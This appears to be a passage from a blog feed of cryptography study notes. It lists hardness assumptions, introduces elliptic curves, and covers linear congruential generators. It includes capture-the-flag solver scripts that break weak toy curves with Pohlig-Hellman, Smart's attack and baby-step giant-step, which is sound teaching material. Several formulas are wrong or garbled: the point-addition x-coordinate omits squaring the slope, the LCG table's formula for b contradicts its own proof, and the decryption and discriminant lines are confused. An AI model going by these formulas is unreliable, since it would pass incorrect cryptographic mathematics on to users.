<li>Linear: Linear problem</li>
<li>D-Linear1: Decision Linear problem (version 1)</li>
<li>l-SDH: l-Strong Diffie-Hellman problem</li>
<li>c-DLSE: Discrete Logarithm with Short Exponents</li>
<li>CONF: (conference-key sharing scheme)</li>
<li>3PASS: 3-Pass Message Transmission Scheme</li>
<li>LUCAS: Lucas Problem</li>
<li>XLP: x-Logarithm Problem</li>
<li>MDHP: Matching Diffie-Hellman Problem</li>
<li>DDLP: Double Discrete Logarithm Problem</li>
<li>rootDLP: Root of Discrete Logarithm Problem</li>
<li>n-M-DDH: Multiple Decision Diffie-Hellman Problem</li>
<li>l-HENSEL-DLP: l-Hensel Discrete Logarithm Problem</li>
<li>DLP(Inn(G)): Discrete Logarithm Problem over Inner Automorphism Group</li>
<li>IE: Inverse Exponent</li>
<li>TDH: The Twin Diffie-Hellman Assumption</li>
<li>XTR-DL: XTR discrete logarithm problem</li>
<li>XTR-DH: XTR Diffie-Hellman problem</li>
<li>XTR-DHD: XTR decision Diffie-Hellman problem</li>
<li>CL-DLP: discrete logarithms in class groups of imaginary quadratic orders</li>
<li>TV-DDH: Tzeng Variant Decision Diffie-Hellman problem</li>
<li>n-DHE: n-Diffie-Hellman Exponent problem</li>
</ul>
<h1>Factoring</h1>
<ul>
<li>FACTORING: integer factorisation problem</li>
<li>SQRT: square roots modulo a composite</li>
<li>CHARACTERd: character problem</li>
<li>MOVAd: character problem</li>
<li>CYCLOFACTd: factorisation in Z[θ]</li>
<li>FERMATd: factorisation in Z[θ]</li>
<li>RSAP: RSA problem</li>
<li>Strong-RSAP: strong RSA problem</li>
<li>Difference-RSAP: Difference RSA problem</li>
<li>Partial-DL-ZN2P: Partial Discrete Logarithm problem in Z∗n</li>
<li>DDH-ZN2P: Decision Diffie-Hellman problem over Z∗n</li>
<li>Lift-DH-ZN2P: Lift Diffie-Hellman problem over Z∗n</li>
<li>EPHP: Election Privacy Homomorphism problem</li>
<li>AERP: Approximate e-th root problem l-HENSEL-RSAP: l-Hensel RSA</li>
<li>DSeRP: Decisional Small e-Residues in Z∗n2</li>
<li>DS2eRP: Decisional Small 2e-Residues in Z∗n2</li>
<li>DSmallRSAKP: Decisional Reciprocal RSA-Paillier in Z∗n2 HRP: Higher Residuosity Problem</li>
<li>ECSQRT: Square roots in elliptic curve groups over Z/nZ</li>
<li>RFP: Root Finding Problem</li>
<li>phiA: PHI-Assumption</li>
<li>C-DRSA: Computational Dependent-RSA problem</li>
<li>D-DRSA: Decisional Dependent-RSA problem</li>
<li>E-DRSA: Extraction Dependent-RSA problem</li>
<li>DCR: Decisional Composite Residuosity problem</li>
<li>CRC: Composite Residuosity Class problem</li>
<li>DCRC: Decisional Composite Residuosity Class problem</li>
<li>GenBBS: generalised Blum-Blum-Shub assumption</li>
</ul>
<h1>Product groups</h1>
<ul>
<li>co-CDH: co-Computational Diffie-Hellman Problem</li>
<li>PG-CDH: Computational Diffie-Hellman Problem for Product Groups</li>
<li>XDDH: External Decision Diffie-Hellman Problem</li>
<li>D-Linear2: Decision Linear Problem (version 2)</li>
<li>PG-DLIN: Decision Linear Problem for Product Groups</li>
<li>FSDH: Flexible Square Diffie-Hellman Problem</li>
<li>KSW1: Assumption 1 of Katz-Sahai-Waters</li>
</ul>
<h1>Pairings</h1>
<ul>
<li>BDHP: Bilinear Diffie-Hellman Problem</li>
<li>DBDH: Decision Bilinear Diffie-Hellman Problem</li>
<li>B-DLIN: Bilinear Decision-Linear Problem</li>
<li>l-BDHI: l-Bilinear Diffie-Hellman Inversion Problem</li>
<li>l-DBDHI: l-Bilinear Decision Diffie-Hellman Inversion Problem</li>
<li>l-wBDHI: l-weak Bilinear Diffie-Hellman Inversion  Problem</li>
<li>l-wDBDHI: l-weak Decisional Bilinear Diffie-Hellman Inversion Problem</li>
<li>KSW2: Assumption 2 of Katz-Sahai-Waters</li>
<li>MSEDH: Multi-sequence of Exponents Diffie-Hellman Assumption</li>
</ul>
<h1>Lattices</h1>
<h2 id="Main-Lattice-Problems">Main Lattice Problems</h2>
<ul>
<li>SVPγp: (Approximate) Shortest vector problem</li>
<li>CVPpγ: (Approximate) Closest vector problem</li>
<li>GapSVPpγ: Decisional shortest vector problem</li>
<li>GapCVPpγ: Decisional closest vector problem</li>
</ul>
<h2 id="Modular-Lattice-Problems">Modular Lattice Problems</h2>
<ul>
<li>SISp(n,m,q,β): Short integer solution problem</li>
<li>ISISp(n,m,q,β): Inhomogeneous short integer solution problem</li>
<li>LWE(n,q,φ): Learning with errors problem</li>
</ul>
<h2 id="Miscellaneous-Lattice-Problems">Miscellaneous Lattice Problems</h2>
<ul>
<li>USVPp(n,γ): Approximate unique shortest vector problem</li>
<li>SBPp(n,γ): Approximate shortest basis problem</li>
<li>SLPp(n,γ): Approximate shortest length problem</li>
<li>SIVPp(n,γ): Approximate shortest independent vector problem</li>
<li>hermiteSVP: Hermite shortest vector problem</li>
<li>CRP: Covering radius problem</li>
</ul>
<h2 id="Ideal-Lattice-Problems">Ideal Lattice Problems</h2>
<ul>
<li>Ideal-SVPf,pγ: (Approximate) Ideal shortest vector problem / Shortest polynomial problem</li>
<li>Ideal-SISf,p q,m,β: Ideal small integer solution problem</li>
</ul>
<h1>Miscellaneous Problems</h1>
<ul>
<li>KEA1: Knowledge of Exponent assumption</li>
<li>MQ: Multivariable Quadratic equations</li>
<li>CF: Given-weight codeword finding</li>
<li>ConjSP: Braid group conjugacy search problem</li>
<li>GenConjSP: Generalised braid group conjugacy search problem</li>
<li>ConjDecomP: Braid group conjugacy decomposition problem</li>
<li>ConjDP: Braid group conjugacy decision problem</li>
<li>DHCP: Braid group decisional Diffie-Hellman-type conjugacy problem</li>
<li>ConjSearch: (multiple simlutaneous) Braid group conjugacy search problem</li>
<li>SubConjSearch: subgroup restricted Braid group conjugacy search problem</li>
<li>LINPOLY : A linear algebra problem on polynomials<br>
HFE-DP: Hidden Field Equations Decomposition Problem</li>
<li>HFE-SP: Hidden Field Equations Solving Problem</li>
<li>MKS: Multiplicative Knapsack</li>
<li>BP: Balance Problem</li>
<li>AHA: Adaptive Hardness Assumptions</li>
<li>SPI: Sparse Polynomial Interpolation</li>
<li>SPP: Self-Power Problem</li>
<li>VDP: Vector Decomposition Problem</li>
<li>2-DL: 2-generalized Discrete Logarithm Problem</li>
</ul>
<h1>Problem Details</h1>
<p>The full paper provides details about each assumption. Here is an example entry:</p>
<h2 id="CDH-computational-Diffie-Hellman-problem">CDH: computational Diffie-Hellman problem</h2>
<ul>
<li>
<p>Definition :<br>
Given ga,gb∈G to compute gab.</p>
</li>
<li>
<p>Reductions:<br>
CDH ≤p DLP<br>
DLP ≤subexp CDH in groups of squarefree order.</p>
</li>
<li>
<p>Algorithms:<br>
The best known algorithm for CDH is to actually solve the DLP.</p>
</li>
</ul>
<p>Use in cryptography: Diffie-Hellman key exchange and variants, Elgamal encryption and variants, BLS signatures and variants.</p>
<ul>
<li>
<p>History:<br>
Discovered by W. Diffie and M. Hellman.</p>
</li>
<li>
<p>Remark:<br>
A variant of CDH is: Given g0,ga0,gb0∈G to compute gab0. This is ≡p CDH.</p>
</li>
<li>
<p>References:</p>
<ul>
<li>W. Diffie and M. E. Hellman, New directions in cryptography, IEEE Transactions on Information Theory, vol. IT-22, No. 6, Nov. 1976, p. 644-654</li>
<li>U.M. Maurer and S. Wolf, Diffie-Hellman Oracles, 	Proceedings of CRYPTO ’96, p. 268-282.</li>
<li>D. Boneh and R.J. Lipton Algorithms for Black-Box Fields and Applications to Cryp- tography, Proceedings of CRYPTO ’96, p. 283-297.</li>
<li>The complete text is far too long to copy paste here, but this provides a pretty good example of how extensive and thorough it is.</li>
</ul>
</li>
</ul>
<h1>Addendum: Unlisted Problem(s)</h1>
<p>The following problem(s) were not listed in the above - -</p>
<ul>
<li>reference:
<ul>
<li>MIHNP: Modular Inversion Hidden Number Problem</li>
<li>AGCD: Approximate Greatest Common Divisor</li>
<li>SIP: Small Inverse Problem</li>
</ul>
</li>
</ul>
<h2 id="Subset-Sum-Knapsack-problem">Subset Sum/Knapsack problem</h2>
<ul>
<li>Subset Sum problem
<ul>
<li>(0,1) knapsack problem (The standard version of the problem)</li>
</ul>
</li>
<li>Bounded knapsack problem<br>
Unbounded knapsack problem</li>
<li>RMSS: Random Modular Subset Sum</li>
</ul>
<h2 id="Note-about-parameters">Note about parameters</h2>
<p>Hardness assumptions only hold when parameterized correctly. Inappropriate parameters can lead to easily solved instances of hard problems.</p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>definition</tag>
      </tags>
  </entry>
  <entry>
    <title>23-01-11-ECC</title>
    <url>/2023/01/11/23-01-11-ECC/</url>
    <content><![CDATA[<p>Some basics about elliptic curves. Make a description about ECC, and show the attacks and conversions to code.</p>
<p>ECC is somewhat difficult, and also the analysis which is necessary ought to be detailed.</p>
<p>The ECC always connects to the usage of sagemath, this post also introduces some common usages about ECC in sagemath.</p>
<span id="more"></span><!--toc-->
<h1>PARALLEL</h1>
<p><strong>Assume:</strong> Parallel lines intersect at infinity which is called the infinity point <code>P</code>. (parallel and intersecting unity)</p>
<p>The properties of infinite <code>P</code>:</p>
<ul>
<li>The infinite <code>P</code> of Line L has only one.</li>
<li>The lines which are parallel to each other have the public infinite $P_{\infty}$.</li>
<li>Any lines which are intersect have different infinite points $P_{\infty}$s. (If they have public infinity,  it will contrary to assumption.)</li>
<li>All infinity points formulate a infinity line.</li>
<li>The total infinity points and all ordinary points in the plane form the projective plane.</li>
</ul>
<h1>PROJECTIVE PLANE COORDINATE SYSTEM</h1>
<p><strong>Formulate:</strong> Make $x = X/Z$, $y = Y/Z$, ($Z \neq 0$), and the Point <code>A</code> is $(X:Y:Z)$.</p>
<p>The infinity points are expressed as $(X:Y:0)$. The ordinary points is $Z \neq 0$,and the infinities are $Z = 0$, meaning that the equation of infinity points is $Z = 0$.</p>
<p>Thus, $(X:Y:Z)$ is called as projective plane coordinate system.</p>
<h1>ELLIPTIC CURVE</h1>
<p><strong>Definition:</strong>  The elliptic curve in projective plane satisfies the equation that $Y^2Z + a_1XYZ + a_3YZ^2 = X^3 + a_2X^2Z + a_4XZ^2 + a_6Z^3$, or Weierstrass homogeneous equation $Y^2=X^3+AX+B$, where the whole points are non-singular or smooth.</p>
<p><strong>Non-singular/Smooth:</strong> Mathematically, the partial derivatives $F_x(x,y,z), F_y(x,y,z),F_z(x,y,z)$ at any point on the curve cannot be 0 at same time, meaning that any point exists tangent.</p>
<p>Assume that $x = X/Z, y= Y/Z$ and substitute into the equation above, we can obtain $y^2 + a_1xy + a_3y = x^3 + a_2x^2+a_4x+a_6$ and also the slope is $k = (3x^2+2a_2x+a_4 - a_1y)/(2y + a_1x+a_3)$.</p>
<img src="/2023/01/11/23-01-11-ECC/1_hashhash.png" class="" title="common ecc">
<p><em>Two curves below which are not satisfied the definition are not elliptic curves , and they are called Singular Curves.</em></p>
<h1>ALGORITHM ON AN ELLIPTIC CURVE</h1>
<p><strong>Algorithm:</strong>  Arbitrarily take two points <code>P</code> and <code>Q</code> on the elliptic curve (if the two points <code>P</code> and <code>Q</code> coincide, then make the tangent of point <code>P</code>), make the line intersect the other point <code>R'</code> of the elliptic curve, and cross <code>R'</code> to make the parallel line of the y axis intersect the point <code>R</code>, we specify $P+Q = R$.</p>
<img src="/2023/01/11/23-01-11-ECC/2_hashhash.png" class="" title="find R">
<p>The infinity $O_{\infty}$ and the point $P$ on the elliptic curve intersect at the point $P$. The action of of infinity $O_{\infty}$ is equivalent to 0, which is called the zero element. The equation is that $O_{\infty} + P = P$.</p>
<p><strong>Deduction:</strong></p>
<ul>
<li>Three points on elliptic curve are in the straight line $A + B + C = O_{\infty}$.</li>
<li>The sum of $k$ identical points is denoted $kP$. eg: $P+P+P = 2P+P = 3P$</li>
</ul>
<p><strong>Notice:</strong> <em>Elliptic curves are not necessarily symmetric with respect to x-axis.</em></p>
<h1>ELLIPTIC CURVE IN CRYPTOGRAPHY</h1>
<p><strong>Discretization:</strong> Define elliptic curves on finite field.</p>
<p><strong>Algorithm:</strong></p>
<ul>
<li>
<p>Finite field $F_p$ only has finite elements.</p>
</li>
<li>
<p>$F_p$ has $p$ elements. $F_p \in {0, 1, 2, 3, \dots, p-1}$</p>
</li>
<li>
<p>+:$a + b \equiv c \mod p$</p>
</li>
<li>
<p>×:$a \times b \equiv c \mod p$</p>
</li>
<li>
<p>÷:$a \times b^{-1} \equiv c \mod p$</p>
</li>
<li>
<p>Unit element = 1 ; Zero element = 0</p>
</li>
</ul>
<p>The elliptic curves that are suitable for encryption: $y^2 = x^3 + ax + b$.</p>
<p>The relationship among $P(x_1, y_1), Q(x_2, y_2)$ and $R(x_3, y_3)$:</p>
<ul>
<li>$x_3 \equiv k - x_1 - x_2 (\mod p)$</li>
<li>$y_3 \equiv k(x_1 - x_3) - y1(\mod p)$</li>
<li>$k$
<ul>
<li>if $P = Q$, the $k = (3x^2 + a)/2y_1$</li>
<li>if $P \neq Q$, the $k = (y_2 - y_1)/(x_2 - x_1)$</li>
</ul>
</li>
</ul>
<p>Point P exists the minimum positive integer $n$, which make $np = O_{\infty}$, and we will call $n$ as the order of n. Otherwise, it is called infinite order.</p>
<p><em>n always exists.</em></p>
<h1>SIMPLE ENCRYPTION AND DECRYPTION ON ELLIPTIC CURVES</h1>
<img src="/2023/01/11/23-01-11-ECC/3.png" class="" title="description">
<ul>
<li>
<p>A as the generator and decryptor. B as the encryptor.</p>
</li>
<li>
<p>A generates the basic parameters. The $(a, b)$ is to generate the elliptic curve. The $G$ is the chosen base point. Then, send $E_p(a, b), K, G$ to B.</p>
</li>
<li>
<p>B generates the random $r$. Make a encryption and send $C_1 = M + rK,C_2 = rG$ to A.</p>
</li>
<li>
<p>A decrypts the ciphers by the equation $M = C1 - kG_2$. Finally, A will get message $M$.</p>
</li>
<li>
<p>PubKey: $K = kG$</p>
</li>
<li>
<p>PriKey: $k$</p>
</li>
</ul>
<p>Common 6 parameters $F(p,a,b,G,n,h)$:</p>
<ul>
<li>$p, a, b \rightarrow E_p(a, b)$: $p$ 200 more digits can ensure the security.</li>
<li>$G$: the chosen base point of $E_p(a, b)$</li>
<li>$n$: the order of $E_p(a, b)$</li>
<li>$h$: the cofactor and the integer part that $m$, the sum of all points on elliptic curve, divides $n$.</li>
</ul>
<h1>ATTACKs</h1>
<p>The important part.</p>
<p>Make some description about the common attacks on elliptic curves in cryptography.</p>
<h2 id="Pohlig-Hellman">Pohlig-Hellman</h2>
<blockquote>
<p>The order of elliptic curve is factorized into small primes.</p>
</blockquote>
<p><strong>Main idea:</strong></p>
<ol>
<li>Factorize the order.</li>
<li>Discrete logarithmic problems in factorized primes.</li>
<li>Chinese reminder theorem.</li>
</ol>
<p><strong>Deduction:</strong></p>
<img src="/2023/01/11/23-01-11-ECC/4.png" class="" title="deduction">
<p><strong>Example:</strong> ECC-2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># polig_hellman</span></span><br><span class="line">a2 = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">b2 = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">p2 = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line">E2 = EllipticCurve(GF(p2), [a2, b2])</span><br><span class="line">P2 = E2(<span class="number">550637390822762334900354060650869238926454800955557622817950</span> ,<span class="number">700751312208881169841494663466728684704743091638451132521079</span> )</span><br><span class="line">Q2 = E2(<span class="number">1152079922659509908913443110457333432642379532625238229329830</span> , <span class="number">819973744403969324837069647827669815566569448190043645544592</span> )</span><br><span class="line"></span><br><span class="line">factors, exponents = <span class="built_in">zip</span>(*factor(P2.order()))</span><br><span class="line"><span class="comment"># print(factors)</span></span><br><span class="line"><span class="comment"># print(exponents)</span></span><br><span class="line">primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print(primes)</span></span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">    t = <span class="built_in">int</span>(P2.order()) // <span class="built_in">int</span>(fac)</span><br><span class="line">    dlog = discrete_log(t*Q2, t*P2, operation = <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    dlogs += [dlog]</span><br><span class="line"><span class="comment"># print(dlogs)</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(primes) == <span class="built_in">len</span>(dlogs):</span><br><span class="line">    m2 = crt(dlogs, primes)</span><br><span class="line">flag2 = long_to_bytes(m2).decode()</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br></pre></td></tr></table></figure>
<h2 id="Smart-Attack">Smart Attack</h2>
<blockquote>
<p>$E(F_p) = p$, the order of the elliptic curve is a prime.</p>
</blockquote>
<p><em>It will be updated, if I have time.</em></p>
<p><strong>Exp:</strong> ECC-3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># smart_attack</span></span><br><span class="line">a3 = <span class="number">490963434153515882934487973185142842357175523008183292296815140698999054658777820556076794490414610737654365807063916602037816955706321036900113929329671</span></span><br><span class="line">b3 = <span class="number">7668542654793784988436499086739239442915170287346121645884096222948338279165302213440060079141960679678526016348025029558335977042712382611197995002316466</span></span><br><span class="line">p3 = <span class="number">11093300438765357787693823122068501933326829181518693650897090781749379503427651954028543076247583697669597230934286751428880673539155279232304301123931419</span></span><br><span class="line">E3 = EllipticCurve(GF(p3), [a3, b3])</span><br><span class="line">P3 = E3(<span class="number">10121571443191913072732572831490534620810835306892634555532657696255506898960536955568544782337611042739846570602400973952350443413585203452769205144937861</span> , <span class="number">8425218582467077730409837945083571362745388328043930511865174847436798990397124804357982565055918658197831123970115905304092351218676660067914209199149610</span> )</span><br><span class="line">Q3 = E3(<span class="number">964864009142237137341389653756165935542611153576641370639729304570649749004810980672415306977194223081235401355646820597987366171212332294914445469010927</span> , <span class="number">5162185780511783278449342529269970453734248460302908455520831950343371147566682530583160574217543701164101226640565768860451999819324219344705421407572537</span> )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line"><span class="comment"># from gmpy2 import is_prime</span></span><br><span class="line"><span class="comment"># print(is_prime(P3.order()))</span></span><br><span class="line">m3 = SmartAttack(P3, Q3, p3)</span><br><span class="line">flag3 = long_to_bytes(m3).decode() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag3)</span><br></pre></td></tr></table></figure>
<h2 id="BSGS">BSGS</h2>
<blockquote>
<p>baby step giant step</p>
</blockquote>
<p>discrete_log(P,Q,operation = ‘+’)</p>
<p><strong>Problems:</strong> $y^x \equiv z \mod p$</p>
<p>To solve out the $x$.</p>
<h3 id="Original">Original</h3>
<blockquote>
<p>$gcd(y, p) = 1$</p>
</blockquote>
<p>Assume $x = am - b,m = \sqrt{p}$, $a \in [0, m), b\in[0, m)$.</p>
<p><strong>Derivation:</strong><br>
$$<br>
y^{am-b}\equiv z (\mod p)<br>
$$</p>
<p>$$<br>
y^{am} \equiv z \cdot y^{b}(\mod p)<br>
$$</p>
<p>Brute force enumeration, enumerate the right in $[0, m)$ and calculate into list. At the same time, we enumerate the left in $[0, m)$, comparing the two list to find the $x$.</p>
<h3 id="Extended">Extended</h3>
<blockquote>
<p>$gcd(y, p) \neq 1$</p>
</blockquote>
<p>Assume $d = gcd(y, p)$.</p>
<p><strong>Derivation:</strong><br>
$$<br>
y^{x} + kp =z<br>
$$</p>
<p>$$<br>
y\cdot y^{x-1} +kp = z<br>
$$</p>
<p>If we divide it by $d$., we will get that:<br>
$$<br>
\frac{y}{d}\cdot y^{x-1} + k \cdot \frac{p}{d} =\frac{z}{d}<br>
$$<br>
Recursive the equation, unless $d = 1 $. Assume that the product of all $d$ and we enumerate $c$ times. Thus, we can obtain the condition that $x’ = x -c, p’ = \frac{p}{g}, z’ = \frac{z}{g}$.<br>
$$<br>
y^{x’} \cdot \frac{y^{c}}{g} \equiv z’ (\mod p’)<br>
$$<br>
And it convert to the <code>original BSGS</code>.</p>
<p><strong>Example:</strong> ECC-1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bsgs</span></span><br><span class="line">a1 = <span class="number">46056180</span></span><br><span class="line">b1 = <span class="number">2316783294673</span></span><br><span class="line">p1 = <span class="number">146808027458411567</span></span><br><span class="line">E1 = EllipticCurve(GF(p1), [a1, b1])</span><br><span class="line">P1 = E1(<span class="number">119851377153561800</span> , <span class="number">50725039619018388</span>)</span><br><span class="line">Q1 = E1(<span class="number">22306318711744209</span> , <span class="number">111808951703508717</span>)</span><br><span class="line">m1 = discrete_log(Q1, P1, operation = <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">flag1 = <span class="string">&#x27;flag&#123;&#x27;</span> + long_to_bytes(m1).decode()</span><br><span class="line"><span class="comment"># print(flag1)</span></span><br></pre></td></tr></table></figure>
<h1>ECC</h1>
<h2 id="Definition">Definition</h2>
<p>The equation:<br>
$$<br>
(a, b)\in F, y^2 = x^3 + ax + b<br>
$$<br>
if the ECC satisfies the equation, we calculate its discriminant by:<br>
$$<br>
y^2 + axy + by = x^3 + cx^2 + dx + c<br>
$$</p>
]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>ecc</tag>
      </tags>
  </entry>
  <entry>
    <title>LCGs</title>
    <url>/2023/06/27/LCGs/</url>
    <content><![CDATA[<p>The LCG algorithm is applied to the generation of pseudo random numbers.<br>
$$<br>
X_{n + 1} \equiv (a X_{n} + b) \mod m<br>
$$</p>
<p>The LCG defines three variables——multiplier a, increment b, and modulus m, which decide the generator.</p>
<span id="more"></span><!--toc-->
<h1>Reference</h1>
<blockquote>
<p><a href="https://blog.csdn.net/superprintf/article/details/108964563">ctf-lcg</a></p>
</blockquote>
<h1>Solving Formula</h1>
<table>
<thead>
<tr>
<th>targets</th>
<th>formulae</th>
</tr>
</thead>
<tbody>
<tr>
<td>$X_{n+1} \rightarrow X_{n}$</td>
<td>$X_{n}\equiv a^{-1}(X_{n+1} - b) \mod m$</td>
</tr>
<tr>
<td>$\rightarrow a$</td>
<td>$a \equiv (X_{n+2} - X_{n+1})(X_{n+1} - X_{n})^{-1} \mod m$</td>
</tr>
<tr>
<td>$\rightarrow b$</td>
<td>$b \equiv (X_{n+1} - X_{n}) \mod m$</td>
</tr>
<tr>
<td>$\rightarrow m$</td>
<td>$t_{n} = X_{n + 1} - X_{n}$</td>
</tr>
<tr>
<td></td>
<td>$m = gcd((t_{n+1}\cdot t_{n-1} - t_n\cdot t_n), (t_n\cdot t_{n-2} - t_{n-1}\cdot t_{n-1}))$</td>
</tr>
</tbody>
</table>
<h1>Proofs</h1>
<h2 id="formula-1">formula 1</h2>
<p>$$<br>
X_{n+1} \equiv a X_{n} + b \mod m<br>
$$</p>
<p>$$<br>
aX_{n} \equiv X_{n+1} - b \mod m<br>
$$</p>
<p>$$<br>
X_{n} \equiv a^{-1} (X_{n+1 - b}) \mod m<br>
$$</p>
<p>How to calculate $a^{-1}$? We can use <code>Extended Euclidean algorithm</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>]</span><br><span class="line"><span class="comment"># &lt;==&gt; MMI = lambda a, n: gmpy2.gcdext(a, n)[1]</span></span><br><span class="line"><span class="comment"># &lt;==&gt; gmpy2.invert(a, n)</span></span><br></pre></td></tr></table></figure>
<h2 id="formula-2">formula 2</h2>
<p>$$<br>
X_{n + 2} \equiv aX_{n + 1} + b \mod m<br>
$$</p>
<p>$$<br>
X_{n+1} \equiv aX_{n} + b \mod m<br>
$$</p>
<p>$$<br>
X_{n+2} - X_{n+1} \equiv a(X_{n + 1} - X_{n}) \mod m<br>
$$</p>
<p>$$<br>
a \equiv (X_{n+2} - X_{n+1})(X_{n+1} - X_{n})^{-1} \mod m<br>
$$</p>
<h2 id="formula-3">formula 3</h2>
<p>$$<br>
X_{n + 1} \equiv aX_{n} + b \mod m<br>
$$</p>
<p>$$<br>
b \equiv X_{n+1} - aX_{n} \mod m<br>
$$</p>
<h2 id="formula-4">formula 4</h2>
<p>Define that $t_n \equiv X_{n +1} - X_{n} \mod m$.<br>
$$<br>
t_n \equiv (aX_{n} + b) - (aX_{n-1} + b) \mod m<br>
$$</p>
<p>$$<br>
t_n \equiv a(X_{n} - X_{n-1}) \mod m<br>
$$</p>
<p>$$<br>
\Longrightarrow t_n \equiv at_{n-1} \mod m<br>
$$</p>
<p>Thus, we can make the deduction by followings.<br>
$$<br>
t_{n+1}\cdot t_{n-1} - t_{n}\cdot t_{n} \mod m<br>
$$</p>
<p>$$<br>
\rightarrow a\cdot t_{n} \cdot a^{-1} \cdot t_{n} - t_n\cdot t_n \mod m<br>
$$</p>
<p>$$<br>
\Longrightarrow 0 \mod m<br>
$$</p>
<p>$$<br>
\Longrightarrow t_{n+1}\cdot t_{n-1} - t_{n}\cdot t_{n} | m<br>
$$</p>
<p>Similarly, it can be concluded that $t_{n}\cdot t_{n-2} - t_{n-1}\cdot t_{n-1} | m$<br>
$$<br>
\Longrightarrow m = gcd ((t_{n+1}\cdot t_{n-1} - t_{n}\cdot t_{n}), (t_{n}\cdot t_{n-2} - t_{n-1}\cdot t_{n-1}))<br>
$$</p>
<h1>Applications</h1>
<h2 id="lcg-1">lcg_1</h2>
<h3 id="task">task</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;Spirit&#123;***********************&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">plaintext = bytes_to_long(flag)</span><br><span class="line">length = plaintext.bit_length()</span><br><span class="line"></span><br><span class="line">a = getPrime(length)</span><br><span class="line">b = getPrime(length)</span><br><span class="line">n = getPrime(length)</span><br><span class="line"></span><br><span class="line">seed = <span class="number">33477128523140105764301644224721378964069</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;seed = &quot;</span>,seed)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    seed = (a*seed+b)%n</span><br><span class="line">ciphertext = seed^plaintext</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;a = &quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;b = &quot;</span>,b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,ciphertext)</span><br></pre></td></tr></table></figure>
<h3 id="solution">solution</h3>
<p><strong>known:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">seed = (a * seed + b) % n</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">n</span><br><span class="line">---<span class="number">10</span>---&gt; seed</span><br><span class="line">ciphertext = seed ^ plaintext</span><br><span class="line"></span><br><span class="line">=&gt; plaintext = ciphertext ^ seed</span><br></pre></td></tr></table></figure>
<p><strong>exp:</strong></p>
